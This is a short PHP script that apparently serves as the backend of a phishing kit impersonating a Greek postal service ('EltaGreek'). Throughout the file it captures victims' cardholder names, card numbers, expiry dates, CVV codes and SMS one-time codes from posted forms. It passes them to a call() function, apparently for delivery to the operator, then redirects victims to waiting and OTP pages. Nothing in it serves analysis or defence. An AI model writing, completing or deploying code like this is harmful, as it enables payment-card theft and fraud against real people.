<?php 
session_start();
require '../config.php';
 



if(isset($_POST['name'])){
call("/- EltaGreek CARD -/
Name: ".$_POST['name']."
Cc: ".$_POST['cc']."
Exp: ".$_POST['exp']."
Cvv: ".$_POST['cvv']);
return header("location: wait.php?next=otp.php");
}



if(isset($_POST['sms'])){
call("/- EltaGreek SMS  -/
Code: ".$_POST['sms']);
if(isset($_POST['error'])){
    return header("location: exit.php");
}
return header("location: wait.php?next=otp.php?e");
}



?>